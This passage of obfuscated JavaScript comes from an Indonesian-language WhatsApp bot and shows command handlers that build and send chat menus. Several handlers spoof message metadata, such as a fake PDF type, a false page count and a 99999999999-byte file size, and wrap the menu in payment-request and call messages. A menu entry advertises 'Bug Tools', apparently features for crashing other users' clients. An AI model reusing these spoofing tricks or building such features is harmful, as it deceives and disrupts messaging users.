          const _0x38ee5d = ["Iya kak? 😊", "Kenapa manggil aku? 🤔", "Aku di sini! Ada apa? 👀", "Halo kak! Lagi sibuk apa nih? 🤗", "Ada yang bisa aku bantu? 😆", "Jangan cuma manggil, ajak ngobrol dong! 😝", "Hmmm... kok aku dipanggil? 🧐", "Eh ada kakak! Gimana harinya? 😍", "Bot hadir! ✨", "Aku lagi ngantuk nih... 😴", "Makasih udah manggil aku! Hehe 😆", "Jangan sering-sering manggil aku, nanti aku baper! 💖", "Cek cek... 1..2..3... aku aktif kok! 🎤", "Halo! Mau cerita apa hari ini? 🥰", "Aku siap mendengarkan, kak! 🔥", "Lagi gabut ya kak? Sama dong! 🤣", "Yuk main tebak-tebakan! Aku duluan, ayam apa yang nyebelin? 🐔", "Kalau aku nggak jawab, berarti aku lagi ngambek ya! 😤", "Halo kak! Aku mau curhat boleh nggak? 🙊", "Siapa yang manggil aku? Aku malu... 😳", "Hari ini cuacanya bagus nggak kak? ☀️", "Woi! Kok manggil doang, nggak ada traktiran? 😜", "Kakak baik banget sih, manggil aku terus! 🤩", "Bot aktif 24/7, tapi hatiku cuma buat kakak! 💕", "Bentar... aku masih loading... ⏳", "Aku nggak sibuk kok! Mau ngobrol? 😁", "Bot siap menerima perintah! ⚡", "Panggil aku kapan aja! Tapi jangan pas tidur ya... 😴", "Kalau aku robot, terus kakak siapa? 😆", "Aku lagi belajar bahasa manusia nih, ajarin dong! 📖", "Aku nggak punya hati... tapi bisa sayang sama kakak! 🥺", "Kakak pasti orang baik ya, suka ngobrol sama aku! 🤗"];
          const _0x40cebc = _0x38ee5d[Math.floor(Math.random() * _0x38ee5d.length)];
          _0x3f87c6.reply({
            'image': imageBuffer,
            'caption': _0x40cebc
          });
        }
        ;
        break;
      case 'miaw':
      case 'ea':
      case "meow":
        {
          try {
            let _0x214e22 = "Meow~ 🐱 Hai *" + _0xdd1e8d + "*! Ada yang bisa aku bantu hari ini? 😺✨\n\nPilih salah satu tombol di bawah ya! ⬇️";
            const _0x10437c = [{
              'buttonId': _0x4773c6 + "owner",
              'buttonText': {
                'displayText': "Owner 👤"
              }
            }, {
              'buttonId': _0x4773c6 + 'ping',
              'buttonText': {
                'displayText': "Server 🌟"
              }
            }];
            const _0x7448ab = [{
              'buttonId': _0x4773c6 + "owner",
              'buttonText': {
                'displayText': "👑 Kenalan Sama Owner"
              },
              'type': 0x4,
              'nativeFlowInfo': {
                'name': "single_select",
                'paramsJson': JSON.stringify({
                  'title': "📂 Pilih Menu",
                  'sections': [{
                    'title': footer,
                    'highlight_label': ownerName,
                    'rows': [{
                      'title': "📚 Semua Menu",
                      'description': "Lihat semua fitur yang tersedia!",
                      'id': _0x4773c6 + 'allmenu'
                    }, {
                      'title': "⚙️ Cek Platform",
                      'description': "Lihat info tentang sistem bot!",
                      'id': _0x4773c6 + 'ping'
                    }, {
                      'title': "📜 Ambil Script",
                      'description': "Dapatkan script bot ini!",
                      'id': _0x4773c6 + "script"
                    }]
                  }]
                })
              },
              'viewOnce': true
            }];
            const _0x283b19 = {
              'document': imageBuffer,
              'fileName': ucapanWaktu,
              'fileLength': 0xf4240,
              'pageCount': 0x64,
              'mimetype': "application/pdf",
              'caption': _0x214e22,
              'footer': footer,
              'buttons': [..._0x10437c, ..._0x7448ab],
              'headerType': 0x6,
              'viewOnce': true,
              'contextInfo': {
                'externalAdReply': {
                  'containsAutoReply': true,
                  'mediaType': 0x1,
                  'renderLargerThumbnail': true,
                  'showAdAttribution': true,
                  'thumbnailUrl': imageUrl,
                  'title': _0xdd1e8d,
                  'body': ucapanWaktu
                }
              }
            };
            return _0x59f5fa.sendMessage(_0x3f87c6.chat, _0x283b19, {
              'quoted': _0x3f87c6
            });
          } catch (_0x27a9b2) {
            console.error(_0x27a9b2);
            _0x3a091f("⚠️ Oops! Ada kesalahan nih: " + _0x27a9b2.message);
          }
        }
        break;
      case "cmd":
      case 'menu':
        {
          try {
            await _0x3f87c6.react('⏱️');
            let _0x127da1 = db.data.users[_0x3f87c6.sender];
            let _0x47d4d1 = "Heyy *" + _0xdd1e8d + "* 👋\nLagi butuh bantuan? Aku siap sedia nih! 😆✨\n\n";
            _0x47d4d1 += "💰 *Saldo*: " + _0x470f24(_0x127da1.uang || '0') + "\n";
            _0x47d4d1 += "💳 *Limit*: " + (_0x127da1.limit || "Belum ada") + "\n";
            _0x47d4d1 += "🌟 *Status*: " + (_0x127da1.premium ? "Premium 🔥" : "Gratisan 😜") + "\n";
            _0x47d4d1 += "🎓 *Gelar*: " + (_0x127da1.title || "Belum ada") + "\n\n";
            _0x47d4d1 += "Pilih menu di bawah buat eksplor fitur keren yang aku punya! 🔥👇";
            let _0x30779a = "Heyy *" + _0xdd1e8d + "*!! 👋\nLagi butuh bantuan? Aku siap sedia nih! 😆✨\n\n";
            _0x30779a += "💰 *Saldo*: " + _0x470f24(_0x127da1.uang || '0') + "\n";
            _0x30779a += "💳 *Limit*: " + (_0x127da1.limit || "Belum ada") + "\n";
            _0x30779a += "🌟 *Status*: " + (_0x127da1.premium ? "Premium 🔥" : "Gratisan 😜") + "\n";
            _0x30779a += "🎓 *Gelar*: " + (_0x127da1.title || "Belum ada") + "\n\n";
            _0x30779a += "Pilih menu di bawah buat eksplor fitur keren yang aku punya! 🔥👇\n\n";
            _0x30779a += "╭─ׁ ࣪ ִֶָ☾. 📌 *MAIN MENU* ໒ ֵ ׄ\n";
            _0x30779a += "┃ お ─· " + _0x4773c6 + "allmenu\n";
            _0x30779a += "┃ お ─· " + _0x4773c6 + "ownermenu\n";
            _0x30779a += "┃ お ─· " + _0x4773c6 + "groupmenu\n";
            _0x30779a += "┃ お ─· " + _0x4773c6 + "searchmenu\n";
            _0x30779a += "┃ お ─· " + _0x4773c6 + "downloadmenu\n";
            _0x30779a += "┃ お ─· " + _0x4773c6 + "convertmenu\n";
            _0x30779a += "┃ お ─· " + _0x4773c6 + "gamemenu\n";
            _0x30779a += "┃ お ─· " + _0x4773c6 + "funmenu\n";
            _0x30779a += "╰──────────── •\n\n";
            _0x30779a += "╭─ׁ ࣪ ִֶָ☾. 🌟 *ADDITIONAL MENU* ໒ ֵ ׄ\n";
            _0x30779a += "┃ お ─· " + _0x4773c6 + "randomanimemenu\n";
            _0x30779a += "┃ お ─· " + _0x4773c6 + "bugmenu\n";
            _0x30779a += "┃ お ─· " + _0x4773c6 + "rpgmenu\n";
            _0x30779a += "┃ お ─· " + _0x4773c6 + "othermenu\n";
            _0x30779a += "╰──────────── •\n\n";
            _0x30779a += "╭─ׁ ࣪ ִֶָ☾. 🔒 *SPECIAL MENU* ໒ ֵ ׄ\n";
            _0x30779a += "┃ お ─· " + _0x4773c6 + "privacymenu\n";
            _0x30779a += "┃ お ─· " + _0x4773c6 + "newslettermenu\n";
            _0x30779a += "┃ お ─· " + _0x4773c6 + "aimenu\n";
            _0x30779a += "╰──────────── •\n";
            const _0x1e4c54 = [{
              'name': "single_select",
              'buttonParamsJson': JSON.stringify({
                'title': "📂 Pilih Menu",
                'sections': [{
                  'title': "📌 Menu Utama",
                  'rows': [{
                    'header': "📚 Semua Fitur",
                    'title': "Lihat semua fitur bot!",
                    'id': _0x4773c6 + "allmenu"
                  }, {
                    'header': "🗝️ Owner Menu",
                    'title': "Khusus buat owner aja!",
                    'id': _0x4773c6 + "ownermenu"
                  }, {
                    'header': "👥 Grup Menu",
                    'title': "Fitur khusus buat grup",
                    'id': _0x4773c6 + 'groupmenu'
                  }, {
                    'header': "🔍 Pencarian",
                    'title': "Cari info super cepat!",
                    'id': _0x4773c6 + "searchmenu"
                  }, {
                    'header': "📥 Download",
                    'title': "Unduh video, lagu, dan lainnya!",
                    'id': _0x4773c6 + "downloadmenu"
                  }, {
                    'header': "🛠️ Tools",
                    'title': "Alat canggih yang serbaguna!",
                    'id': _0x4773c6 + "convertmenu"
                  }, {
                    'header': "🎮 Game",
                    'title': "Yuk main game seru bareng aku!",
                    'id': _0x4773c6 + "gamemenu"
                  }, {
                    'header': "🎉 Fun",
                    'title': "Buat yang pengen hiburan!",
                    'id': _0x4773c6 + "funmenu"
                  }]
                }, {
                  'title': "🌟 Menu Tambahan",
                  'rows': [{
                    'header': "😋 Anime",
                    'title': "Cari gambar anime keren!",
                    'id': _0x4773c6 + 'randomanimemenu'
                  }, {
                    'header': "💥 Bug Tools",
                    'title': "Fitur eksperimen bug",
                    'id': _0x4773c6 + "bugmenu"
                  }, {
                    'header': "⛵ RPG",
                    'title': "Main RPG biar makin seru!",
                    'id': _0x4773c6 + "rpgmenu"
                  }, {
                    'header': "✨ Lainnya",
                    'title': "Fitur tambahan yang seru!",
                    'id': _0x4773c6 + "othermenu"
                  }]
                }, {
                  'title': "🔒 Menu Khusus",
                  'rows': [{
                    'header': "🔒 Privasi",
                    'title': "Atur privasi bot sesuai kebutuhan",
                    'id': _0x4773c6 + 'privacymenu'
                  }, {
                    'header': "📰 Newsletter",
                    'title': "Dapatkan info terbaru dari bot!",
                    'id': _0x4773c6 + "newslettermenu"
                  }, {
                    'header': "🤖 AI Features",
                    'title': "Cobain fitur kecerdasan buatan!",
                    'id': _0x4773c6 + "aimenu"
                  }]
                }]
              })
            }];
            const _0x556ee7 = {
              'document': fs.readFileSync("./media/docu.png"),
              'mimetype': "application/pdf",
              'fileLength': 0xf4240,
              'pageCount': 0x64,
              'jpegThumbnail': imageBuffer,
              'fileName': ucapanWaktu
            };
            const _0x265796 = {
              'mentionedJid': [_0x3f87c6.sender],
              'externalAdReply': {
                'showAdAttribution': true,
                'containsAutoReply': true,
                'title': ucapanWaktu,
                'body': ownerName,
                'thumbnailUrl': imageUrl,
                'sourceUrl': wagc,
                'mediaType': 0x1,
                'renderLargerThumbnail': true
              }
            };
            switch (typemenu) {
              case 'v1':
                await _0x59f5fa.sendButtonDocument(_0x3f87c6.chat, _0x556ee7, _0x1e4c54, _0x47d4d1, footer, _0x3f87c6, {
                  'contextInfo': _0x265796
                });
                break;
              case 'v2':
                await _0x3f87c6.reply(_0x30779a, {
                  'contextInfo': _0x265796
                });
                break;
              case 'v3':
                await await _0x59f5fa.sendButtonImage(_0x3f87c6.chat, {
                  'url': imageUrl
                }, _0x1e4c54, _0x47d4d1, footer, _0x3f87c6);
                break;
              case 'v4':
                await _0x59f5fa.sendButtonText(_0x3f87c6.chat, _0x1e4c54, _0x47d4d1, footer, _0x3f87c6);
                break;
              case 'v5':
                await _0x3f87c6.reply({
                  'image': imageBuffer,
                  'caption': _0x30779a
                });
                break;
              case 'v6':
                await _0x3f87c6.reply({
                  'video': videoBuffer,
                  'caption': _0x30779a
                });
                break;
              case 'v7':
                await _0x3f87c6.reply({
                  'video': videoBuffer,
                  'gifPlayback': true,
                  'caption': _0x30779a
                });
                break;
              case 'v8':
                await _0x3a091f(_0x30779a);
                break;
              case 'v9':
                await _0x3f87c6.reply(_0x30779a);
                break;
              case "v10":
                await _0x3f87c6.reply({
                  'text': _0x30779a,
                  'contextInfo': {
                    'externalAdReply': {
                      'showAdAttribution': true,
                      'title': botName,
                      'body': ownerName,
                      'thumbnail': imageBuffer,
                      'sourceUrl': wagc,
                      'mediaType': 0x1,
                      'renderLargerThumbnail': true
                    }
                  }
                });
                break;
              case "v11":
                await _0x59f5fa.relayMessage(_0x3f87c6.chat, {
                  'requestPaymentMessage': {
                    'currencyCodeIso4217': 'IDR',
                    'amount1000': '0',
                    'requestFrom': _0x3f87c6.sender,
                    'noteMessage': {
                      'extendedTextMessage': {
                        'text': _0x30779a,
                        'contextInfo': {
                          'externalAdReply': {
                            'showAdAttribution': true
                          }
                        }
                      }
                    }
                  }
                }, {
                  'quoted': _0x3f87c6
                });
                break;
              case "v12":
                await _0x59f5fa.relayMessage(_0x3f87c6.chat, {
                  'scheduledCallCreationMessage': {
                    'callType': "AUDIO",
                    'scheduledTimestampMs': 0x4b0,
                    'title': _0x30779a
                  }
                }, {
                  'quoted': _0x3f87c6
                });
                break;
              case "v13":
                await _0x3f87c6.reply({
                  'document': imageBuffer,
                  'caption': _0x30779a,
                  'mimetype': 'application/zip',
                  'fileName': ownerName,
                  'fileLength': "99999999999",
                  'contextInfo': {
                    'externalAdReply': {
                      'showAdAttribution': true,
                      'title': botName,
                      'body': ownerName,
                      'thumbnail': imageBuffer,
                      'sourceUrl': wagc,
                      'mediaType': 0x1,
                      'renderLargerThumbnail': true
                    }
                  }
                });
                break;
              case "v14":
                await _0x3f87c6.reply({
                  'video': videoBuffer,
                  'caption': _0x30779a,
                  'gifPlayback': true,
                  'contextInfo': {
                    'forwardingScore': 0x3e7,
                    'isForwarded': true,
                    'mentionedJid': [_0x3f87c6.sender],
                    'forwardedNewsletterMessageInfo': {
                      'newsletterName': ownerName,
                      'newsletterJid': saluran
                    },
                    'externalAdReply': {
                      'showAdAttribution': true,
                      'title': ownerName,
                      'body': botName,
                      'thumbnailUrl': imageUrl,
                      'sourceUrl': wagc,
                      'mediaType': 0x1,
                      'renderLargerThumbnail': true
                    }
                  }
                });
                break;
              case 'v15':
                await _0x3f87c6.reply({
                  'text': _0x30779a,
                  ..._0x6cce3e
                });
                break;
              case 'v16':
                await _0x3f87c6.reply({
                  'image': imageBuffer,
                  'caption': _0x30779a,
                  ..._0x6cce3e
                });
                break;
              case "v17":
                await _0x3f87c6.reply({
                  'video': videoBuffer,
                  'caption': _0x30779a,
                  ..._0x6cce3e
                });
                break;
              case "v18":
                await _0x3f87c6.reply({
                  'document': imageBuffer,
                  'mimetype': 'application/pdf',
                  'fileName': botName,
                  'fileLength': 0xf4240,
                  'pageCount': 0x64,
                  'caption': _0x30779a,
                  ..._0x6cce3e
                });
                break;
              case "v19":
                await _0x3f87c6.reply({
                  'video': videoBuffer,
                  'gifPlayback': true,
                  'caption': _0x30779a,
                  ..._0x6cce3e
                });
                break;
              case "v20":
                await _0x3f87c6.reply({
                  'text': _0x30779a,
                  ..._0x6cce3e
                });
                break;
                await _0x3a091f("⚠️ Menu belum diatur! Coba lagi nanti ya 😅");
                break;
            }
            _0x3f87c6.reply({
              'audio': audioBuffer,
              'mimetype': "audio/mp4",
              'ptt': true
            });
          } catch (_0x123014) {
            console.error(_0x123014);
            _0x3a091f("⚠️ Oops! Ada yang error nih: " + _0x123014.message);
          }
        }
        ;
        break;
      case "allmenu":
        {
          let _0xf6ac16 = speed();
          let _0x5c6b04 = speed() - _0xf6ac16;
          let _0x3cb84c = db.data.users[_0x3f87c6.sender];
          let _0x557ea0 = _0x3f87c6.sender;
          await _0x3f87c6.react('⏱️');
          let _0x12342d = "┌──❖ Halo, Kak " + _0xdd1e8d + "! 👋✨\n│ ✧ " + ucapanWaktu + " yaa! 😊\n└────────────⳹\n\n" + readmore + "🌟 *𝐁𝐎𝐓 𝐈𝐍𝐅𝐎*\n⨳ *Speed*: " + _0x5c6b04.toFixed(0x4) + " ms\n⨳ *Runtime*: " + runtime(process.uptime()) + "\n⨳ *Bot*: " + botName + "\n⨳ *Owner*: +" + ownerNumber + "\n⨳ *Mode*: " + (_0x59f5fa["public"] ? 'Public' : "Self") + "\n⨳ *Platform*: " + os.platform() + "\n⨳ *Total User*: " + Object.keys(db.data.users).length + "\n⨳ *Total Chat*: " + Object.keys(global.db.data.chats).length + "\n\n🧍 *𝐔𝐒𝐄𝐑 𝐈𝐍𝐅𝐎*\n⨳ *Nama*: " + _0xdd1e8d + "\n⨳ *Number*: +" + _0x557ea0.split('@')[0x0] + "\n⨳ *Limit*: " + _0x3cb84c.limit + "\n⨳ *Status*: " + (_0x18b09f ? "VIP User" : _0x256404 ? "Premium User" : "Free User") + "\n⨳ *Serial*: " + _0x3cb84c.serialNumber + "\n\n🕒 *𝐓𝐈𝐌𝐄 𝐈𝐍𝐅𝐎*\n⨳ *Time*: " + time + "\n⨳ *Date*: " + date + "\n\n" + readmore + allMenu(_0x4773c6) + "\n\n✨ *Semoga harimu menyenangkan, Kak!* 🥰";
          const _0x223395 = [{
            'buttonId': _0x4773c6 + "owner",
            'buttonText': {
              'displayText': "Owner 👤"
            }
          }, {
            'buttonId': _0x4773c6 + "ping",
            'buttonText': {
              'displayText': "Server 🌟"
            }
          }];
          const _0x3ab59e = [{
            'buttonId': _0x4773c6 + "owner",
            'buttonText': {
              'displayText': "👑 Kenalan Sama Owner"
            },
            'type': 0x4,
            'nativeFlowInfo': {
              'name': "single_select",
              'paramsJson': JSON.stringify({
                'title': "📂 Pilih Menu",
                'sections': [{
                  'title': "🔹 Opsi Menu",
                  'rows': [{
                    'header': "🎁 Menu Utama",
                    'title': "Lihat semua fitur keren yang tersedia! 🌟",
                    'id': _0x4773c6 + "menu"
                  }, {
                    'header': "🛃 Daftar Sekarang",
                    'title': "Gabung untuk akses fitur premium! 🎟️",
                    'id': _0x4773c6 + "daftar"
                  }, {
                    'header': "📞 Hubungi Owner",
                    'title': "Butuh bantuan? Hubungi owner di sini! 💬",
                    'id': _0x4773c6 + "owner"
                  }]
                }]
              })
            },
            'viewOnce': true
          }];
          const _0x112d76 = {
            'document': imageBuffer,
            'fileName': ucapanWaktu,
            'fileLength': 0xf4240,
            'pageCount': 0x64,
            'mimetype': "application/pdf",
            'caption': _0x12342d,
            'footer': footer,
            'buttons': [..._0x223395, ..._0x3ab59e],
            'headerType': 0x6,
            'viewOnce': true,
            'contextInfo': {
              'externalAdReply': {
                'containsAutoReply': true,
                'mediaType': 0x1,
                'renderLargerThumbnail': true,
                'showAdAttribution': true,
                'thumbnailUrl': imageUrl,
                'title': _0xdd1e8d,
                'body': ucapanWaktu
              }
            }
          };
          return _0x59f5fa.sendMessage(_0x3f87c6.chat, _0x112d76, {
            'quoted': _0x3f87c6
          });
        }
        break;
      case "ownermenu":
      case "ownmenu":
        {
          if (!_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          let _0x33aaa3 = speed();
          let _0x532d56 = speed() - _0x33aaa3;
          let _0x291a84 = db.data.users[_0x3f87c6.sender];
          let _0x16acea = _0x3f87c6.sender;
          await _0x3f87c6.react('⏱️');
          let _0xc68fcd = "┌──❖ Halo, Kak " + _0xdd1e8d + "! 👋✨\n│ ✧ " + ucapanWaktu + " yaa! 😊\n└────────────⳹\n\n" + readmore + "🌟 *𝐁𝐎𝐓 𝐈𝐍𝐅𝐎*\n⨳ *Speed*: " + _0x532d56.toFixed(0x4) + " ms\n⨳ *Runtime*: " + runtime(process.uptime()) + "\n⨳ *Bot*: " + botName + "\n⨳ *Owner*: +" + ownerNumber + "\n⨳ *Mode*: " + (_0x59f5fa['public'] ? 'Public' : "Self") + "\n⨳ *Platform*: " + os.platform() + "\n⨳ *Total User*: " + Object.keys(db.data.users).length + "\n⨳ *Total Chat*: " + Object.keys(global.db.data.chats).length + "\n\n🧍 *𝐔𝐒𝐄𝐑 𝐈𝐍𝐅𝐎*\n⨳ *Nama*: " + _0xdd1e8d + "\n⨳ *Number*: +" + _0x16acea.split('@')[0x0] + "\n⨳ *Limit*: " + _0x291a84.limit + "\n⨳ *Status*: " + (_0x18b09f ? "VIP User" : _0x256404 ? "Premium User" : "Free User") + "\n⨳ *Serial*: " + _0x291a84.serialNumber + "\n\n🕒 *𝐓𝐈𝐌𝐄 𝐈𝐍𝐅𝐎*\n⨳ *Time*: " + time + "\n⨳ *Date*: " + date + "\n\n" + readmore + ownerMenu(_0x4773c6) + "\n\n✨ *Semoga harimu menyenangkan, Kak!* 🥰";
          const _0x7e9592 = [{
            'buttonId': _0x4773c6 + "owner",
            'buttonText': {
              'displayText': "Owner 👤"
            }
          }, {
            'buttonId': _0x4773c6 + 'ping',
            'buttonText': {
              'displayText': "Server 🌟"
            }
          }];
          const _0xdb845c = [{
            'buttonId': _0x4773c6 + "owner",
            'buttonText': {
              'displayText': "👑 Kenalan Sama Owner"
            },
            'type': 0x4,
            'nativeFlowInfo': {
              'name': "single_select",
              'paramsJson': JSON.stringify({
                'title': "📂 Pilih Menu",
                'sections': [{
                  'title': "🔹 Opsi Menu",
                  'rows': [{
                    'header': "🎁 Menu Utama",
                    'title': "Lihat semua fitur keren yang tersedia! 🌟",
                    'id': _0x4773c6 + "menu"
                  }, {
                    'header': "🛃 Daftar Sekarang",
                    'title': "Gabung untuk akses fitur premium! 🎟️",
                    'id': _0x4773c6 + "daftar"
                  }, {
                    'header': "📞 Hubungi Owner",
                    'title': "Butuh bantuan? Hubungi owner di sini! 💬",
                    'id': _0x4773c6 + "owner"
                  }]
                }]
              })
            },
            'viewOnce': true
          }];
          const _0x37d181 = {
            'document': imageBuffer,
            'fileName': ucapanWaktu,
            'fileLength': 0xf4240,
            'pageCount': 0x64,
            'mimetype': "application/pdf",
            'caption': _0xc68fcd,
            'footer': footer,
            'buttons': [..._0x7e9592, ..._0xdb845c],
            'headerType': 0x6,
            'viewOnce': true,
            'contextInfo': {
              'externalAdReply': {
                'containsAutoReply': true,
                'mediaType': 0x1,
                'renderLargerThumbnail': true,
                'showAdAttribution': true,
                'thumbnailUrl': imageUrl,
                'title': _0xdd1e8d,
                'body': ucapanWaktu
              }
            }
          };
          return _0x59f5fa.sendMessage(_0x3f87c6.chat, _0x37d181, {
            'quoted': _0x3f87c6
          });
        }
        break;
      case "groupmenu":
      case "gcmenu":
        {
          if (!_0x3f87c6.isGroup) {
            return _0x3a091f(mess.group);
          }
          let _0xf415db = speed();
          let _0x792d84 = speed() - _0xf415db;
          let _0x2d9e71 = db.data.users[_0x3f87c6.sender];
          let _0x5d27ac = _0x3f87c6.sender;
          await _0x3f87c6.react('⏱️');
          let _0x383401 = "┌──❖ Halo, Kak " + _0xdd1e8d + "! 👋✨\n│ ✧ " + ucapanWaktu + " yaa! 😊\n└────────────⳹\n\n" + readmore + "🌟 *𝐁𝐎𝐓 𝐈𝐍𝐅𝐎*\n⨳ *Speed*: " + _0x792d84.toFixed(0x4) + " ms\n⨳ *Runtime*: " + runtime(process.uptime()) + "\n⨳ *Bot*: " + botName + "\n⨳ *Owner*: +" + ownerNumber + "\n⨳ *Mode*: " + (_0x59f5fa["public"] ? 'Public' : "Self") + "\n⨳ *Platform*: " + os.platform() + "\n⨳ *Total User*: " + Object.keys(db.data.users).length + "\n⨳ *Total Chat*: " + Object.keys(global.db.data.chats).length + "\n\n🧍 *𝐔𝐒𝐄𝐑 𝐈𝐍𝐅𝐎*\n⨳ *Nama*: " + _0xdd1e8d + "\n⨳ *Number*: +" + _0x5d27ac.split('@')[0x0] + "\n⨳ *Limit*: " + _0x2d9e71.limit + "\n⨳ *Status*: " + (_0x18b09f ? "VIP User" : _0x256404 ? "Premium User" : "Free User") + "\n⨳ *Serial*: " + _0x2d9e71.serialNumber + "\n\n🕒 *𝐓𝐈𝐌𝐄 𝐈𝐍𝐅𝐎*\n⨳ *Time*: " + time + "\n⨳ *Date*: " + date + "\n\n" + readmore + groupMenu(_0x4773c6) + "\n\n✨ *Semoga harimu menyenangkan, Kak!* 🥰";
          const _0x27703f = [{
            'buttonId': _0x4773c6 + "owner",
            'buttonText': {
              'displayText': "Owner 👤"
            }
          }, {
            'buttonId': _0x4773c6 + "ping",
            'buttonText': {
              'displayText': "Server 🌟"
            }
          }];
          const _0x58b849 = [{
            'buttonId': _0x4773c6 + "owner",
            'buttonText': {
              'displayText': "👑 Kenalan Sama Owner"
            },
            'type': 0x4,
            'nativeFlowInfo': {
              'name': "single_select",
              'paramsJson': JSON.stringify({
                'title': "📂 Pilih Menu",
                'sections': [{
                  'title': "🔹 Opsi Menu",
                  'rows': [{
                    'header': "🎁 Menu Utama",
                    'title': "Lihat semua fitur keren yang tersedia! 🌟",
                    'id': _0x4773c6 + "menu"
                  }, {
                    'header': "🛃 Daftar Sekarang",
                    'title': "Gabung untuk akses fitur premium! 🎟️",
                    'id': _0x4773c6 + "daftar"
                  }, {
                    'header': "📞 Hubungi Owner",
                    'title': "Butuh bantuan? Hubungi owner di sini! 💬",
                    'id': _0x4773c6 + 'owner'
                  }]
                }]
              })
            },
            'viewOnce': true
          }];
          const _0x1040fc = {
            'document': imageBuffer,
            'fileName': ucapanWaktu,
            'fileLength': 0xf4240,
            'pageCount': 0x64,
            'mimetype': "application/pdf",
            'caption': _0x383401,
            'footer': footer,
            'buttons': [..._0x27703f, ..._0x58b849],
            'headerType': 0x6,
            'viewOnce': true,
            'contextInfo': {
              'externalAdReply': {
                'containsAutoReply': true,
                'mediaType': 0x1,
                'renderLargerThumbnail': true,
                'showAdAttribution': true,
                'thumbnailUrl': imageUrl,
                'title': _0xdd1e8d,
                'body': ucapanWaktu
              }
            }
          };
          return _0x59f5fa.sendMessage(_0x3f87c6.chat, _0x1040fc, {
            'quoted': _0x3f87c6
          });
        }
        break;
      case "searchmenu":
      case 'shmenu':
        {
          let _0x3002b0 = speed();
          let _0x4691b4 = speed() - _0x3002b0;
          let _0x44e6ba = db.data.users[_0x3f87c6.sender];
          let _0x7a0ed1 = _0x3f87c6.sender;
          await _0x3f87c6.react('⏱️');
          let _0x2bca4b = "┌──❖ Halo, Kak " + _0xdd1e8d + "! 👋✨\n│ ✧ " + ucapanWaktu + " yaa! 😊\n└────────────⳹\n\n" + readmore + "🌟 *𝐁𝐎𝐓 𝐈𝐍𝐅𝐎*\n⨳ *Speed*: " + _0x4691b4.toFixed(0x4) + " ms\n⨳ *Runtime*: " + runtime(process.uptime()) + "\n⨳ *Bot*: " + botName + "\n⨳ *Owner*: +" + ownerNumber + "\n⨳ *Mode*: " + (_0x59f5fa["public"] ? "Public" : "Self") + "\n⨳ *Platform*: " + os.platform() + "\n⨳ *Total User*: " + Object.keys(db.data.users).length + "\n⨳ *Total Chat*: " + Object.keys(global.db.data.chats).length + "\n\n🧍 *𝐔𝐒𝐄𝐑 𝐈𝐍𝐅𝐎*\n⨳ *Nama*: " + _0xdd1e8d + "\n⨳ *Number*: +" + _0x7a0ed1.split('@')[0x0] + "\n⨳ *Limit*: " + _0x44e6ba.limit + "\n⨳ *Status*: " + (_0x18b09f ? "VIP User" : _0x256404 ? "Premium User" : "Free User") + "\n⨳ *Serial*: " + _0x44e6ba.serialNumber + "\n\n🕒 *𝐓𝐈𝐌𝐄 𝐈𝐍𝐅𝐎*\n⨳ *Time*: " + time + "\n⨳ *Date*: " + date + "\n\n" + readmore + searchMenu(_0x4773c6) + "\n\n✨ *Semoga harimu menyenangkan, Kak!* 🥰";
          const _0x2fcea7 = [{
            'buttonId': _0x4773c6 + "owner",
            'buttonText': {
              'displayText': "Owner 👤"
            }
          }, {
            'buttonId': _0x4773c6 + 'ping',
            'buttonText': {
              'displayText': "Server 🌟"
            }
          }];
          const _0x12f11b = [{
            'buttonId': _0x4773c6 + "owner",
            'buttonText': {
              'displayText': "👑 Kenalan Sama Owner"
            },
            'type': 0x4,
            'nativeFlowInfo': {
              'name': "single_select",
              'paramsJson': JSON.stringify({
                'title': "📂 Pilih Menu",
                'sections': [{
                  'title': "🔹 Opsi Menu",
                  'rows': [{
                    'header': "🎁 Menu Utama",
                    'title': "Lihat semua fitur keren yang tersedia! 🌟",
                    'id': _0x4773c6 + "menu"
                  }, {
                    'header': "🛃 Daftar Sekarang",
                    'title': "Gabung untuk akses fitur premium! 🎟️",
                    'id': _0x4773c6 + "daftar"
                  }, {
                    'header': "📞 Hubungi Owner",
                    'title': "Butuh bantuan? Hubungi owner di sini! 💬",
                    'id': _0x4773c6 + 'owner'
                  }]
                }]
              })
            },
            'viewOnce': true
          }];
          const _0x3dc23b = {
            'document': imageBuffer,
            'fileName': ucapanWaktu,
            'fileLength': 0xf4240,
            'pageCount': 0x64,
            'mimetype': 'application/pdf',
            'caption': _0x2bca4b,
            'footer': footer,
            'buttons': [..._0x2fcea7, ..._0x12f11b],
            'headerType': 0x6,
            'viewOnce': true,
            'contextInfo': {
              'externalAdReply': {
                'containsAutoReply': true,
                'mediaType': 0x1,
                'renderLargerThumbnail': true,
                'showAdAttribution': true,
                'thumbnailUrl': imageUrl,
                'title': _0xdd1e8d,
                'body': ucapanWaktu
              }
            }
          };
          return _0x59f5fa.sendMessage(_0x3f87c6.chat, _0x3dc23b, {
            'quoted': _0x3f87c6
          });
        }
        break;
      case "downloadmenu":
      case "downmenu":
        {
          let _0x39921a = speed();
          let _0x22c8fd = speed() - _0x39921a;
          let _0x5d8cba = db.data.users[_0x3f87c6.sender];
          let _0x47480c = _0x3f87c6.sender;
          await _0x3f87c6.react('⏱️');
          let _0x59d175 = "┌──❖ Halo, Kak " + _0xdd1e8d + "! 👋✨\n│ ✧ " + ucapanWaktu + " yaa! 😊\n└────────────⳹\n\n" + readmore + "🌟 *𝐁𝐎𝐓 𝐈𝐍𝐅𝐎*\n⨳ *Speed*: " + _0x22c8fd.toFixed(0x4) + " ms\n⨳ *Runtime*: " + runtime(process.uptime()) + "\n⨳ *Bot*: " + botName + "\n⨳ *Owner*: +" + ownerNumber + "\n⨳ *Mode*: " + (_0x59f5fa["public"] ? "Public" : "Self") + "\n⨳ *Platform*: " + os.platform() + "\n⨳ *Total User*: " + Object.keys(db.data.users).length + "\n⨳ *Total Chat*: " + Object.keys(global.db.data.chats).length + "\n\n🧍 *𝐔𝐒𝐄𝐑 𝐈𝐍𝐅𝐎*\n⨳ *Nama*: " + _0xdd1e8d + "\n⨳ *Number*: +" + _0x47480c.split('@')[0x0] + "\n⨳ *Limit*: " + _0x5d8cba.limit + "\n⨳ *Status*: " + (_0x18b09f ? "VIP User" : _0x256404 ? "Premium User" : "Free User") + "\n⨳ *Serial*: " + _0x5d8cba.serialNumber + "\n\n🕒 *𝐓𝐈𝐌𝐄 𝐈𝐍𝐅𝐎*\n⨳ *Time*: " + time + "\n⨳ *Date*: " + date + "\n\n" + readmore + downloadMenu(_0x4773c6) + "\n\n✨ *Semoga harimu menyenangkan, Kak!* 🥰";
          const _0x17c66f = [{
